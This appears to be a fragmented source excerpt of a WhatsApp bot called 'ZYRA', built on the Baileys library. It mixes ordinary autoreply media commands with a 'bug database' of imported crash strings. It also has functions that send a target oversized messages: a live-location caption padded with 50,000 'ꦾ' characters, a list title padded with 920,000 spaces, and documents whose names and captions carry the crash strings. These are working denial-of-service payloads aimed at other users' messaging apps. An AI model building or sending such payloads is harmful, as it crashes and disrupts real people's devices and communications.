...
//bug database
const { zyratext1 } = require('./80/zyratext1')
const { zyratext2 } = require('./80/zyratext2')
const { zyratext3 } = require('./80/zyratext3')
const { zyratext4 } = require('./80/zyratext4')
const { zyratext5 } = require('./80/zyratext5')
const { zyratext6 } = require('./80/zyratext6')
const { zyratext7 } = require('./80/zyratext7')
const { zyratext8 } = require('./80/zyratext8')
const { zyratext9 } = require('./80/zyratext9')
const { zyratext10 } = require('./80/zyratext10')
const { zyratext11 } = require('./80/zyratext11')
...
const xtime = moment.tz('Africa/Lagos').format('HH:mm:ss')
        ...
        const time2 = moment().tz('Africa/Lagos').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var zyra_time_wisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var zyra_time_wisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var zyra_time_wisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var zyra_time_wisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var zyra_time_wisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var zyra_time_wisher = `Good Morning 🌄`
 } 
...
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./ZYRA/thumb.jpg`),
"sourceUrl": `${link}`}}},
{ quoted: m})
}
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `🦄드림 가이 ZYRA 🦄드림 가이 ZYRA 🦄드림 가이 ZYRA 🦄드림 가이 ZYRA 🦄드림 가이 ZYRA 🦄드림 가이 ZYRA 🦄드림 가이 ZYRA`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
...
async function listxeonfck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "🦄드림 가이 ZYRA"+" ".repeat(920000),
        'footerText': `🦄드림 가이 ZYRA 🦄드림 가이 ZYRA 🦄드림 가이 ZYRA 🦄드림 가이 ZYRA 🦄드림 가이 ZYRA 🦄드림 가이 ZYRA 🦄드림 가이 ZYRA`,
        'description': `🦄드림 가이 ZYRA 🦄드림 가이 ZYRA 🦄드림 가이 ZYRA 🦄드림 가이 ZYRA 🦄드림 가이 ZYRA 🦄드림 가이 ZYRA 🦄드림 가이 ZYRA`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
...
mimetype: `image/null`,
fileName: `${dgxeon}.${zyratext1}` ,
caption: `${dgxeon + zyratext1}`,
...
let audiobuffy = fs.readFileSync(`./ZYRA/audio/${BhosdikaXeon}.mp3`)
GlobalTechInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./ZYRA/sticker/${BhosdikaXeon}.webp`)
GlobalTechInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageXeon){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./ZYRA/image/${BhosdikaXeon}.jpg`)
GlobalTechInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./ZYRA/video/${BhosdikaXeon}.mp4`)
...
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./ZYRA/apk/${BhosdikaXeon}.apk`)
sendapk(buffer)
}
}
...
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./ZYRA/zip/${BhosdikaXeon}.zip`)
sendzip(buffer)
}
}
...
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./ZYRA/doc/${BhosdikaXeon}.pdf`)
senddocu(buffer)
}
}
                ...
                GlobalTechInc.sendMessage(m.chat, {
                    ...
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `SCRIPT OF ${botname} is on YouTube Novo Tech`,
                            thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
...
break
            case 'addvideo': {
                ...
                VideoXeon.push(q)
                await fsx.copy(delb, `./ZYRA/video/${q}.mp4`)
            ...
            case 'delvideo': {
                ...
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoXeon))
                fs.unlinkSync(`./ZYRA/video/${q}.mp4`)
            ...
            case 'addimage': {
                ...
                let delb = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
                ImageXeon.push(q)
                await fsx.copy(delb, `./ZYRA/image/${q}.jpg`)
            ...
            case 'delimage': {
                ...
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageXeon))
                fs.unlinkSync(`./ZYRA/image/${q}.jpg`)
            ...
            case 'addsticker': {
                ...
                let delb = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
                StickerXeon.push(q)
                await fsx.copy(delb, `./ZYRA/sticker/${q}.webp`)
            ...
            case 'delsticker': {
                ...
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
                fs.unlinkSync(`./ZYRA/sticker/${q}.webp`)
            ...
            case 'addvn': {
                ...
                await fsx.copy(delb, `./ZYRA/audio/${q}.mp3`)
            ...
            case 'delvn': {
                ...
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
                fs.unlinkSync(`./ZYRA/audio/${q}.mp3`)
...
let delb = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
ZipXeon.push(teks)
await fsx.copy(delb, `./ZYRA/zip/${teks}.zip`)
...
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(`./ZYRA/zip/${teks}.zip`)
...
let delb = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./ZYRA/apk/${teks}.apk`)
...
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(`./ZYRA/apk/${teks}.apk`)
...
let delb = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./ZYRA/doc/${teks}.pdf`)
...
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(`./ZYRA/doc/${teks}.pdf`)
...
await GlobalTechInc.sendMessage(jid, {
    'document': XeonDoc,
    'fileName': "🦄드림 가이 ZYRA" + zyratext1,
    'mimetype': "application/zip",
    'caption': "🦄드림 가이 ZYRA" + zyratext1,
...
title: `Xeon's ur father`
  ...
  GlobalTechInc.sendMessage(
    chat,
    {
      document: { url: "./settings.js" },
      mimetype: `image/null`,
      fileName: `🦄드림 가이 ZYRA${zyratext11}`,
      caption: `🦄드림 가이 ZYRA ${zyratext11}`,
    },
...
if (typemenu === 'v1') {
                    ...
                    GlobalTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ZYRA/thumb2.mp4'),
      gifPlayback: true,
      caption: xeonmenuoh,
      contextInfo: {
      externalAdReply: {
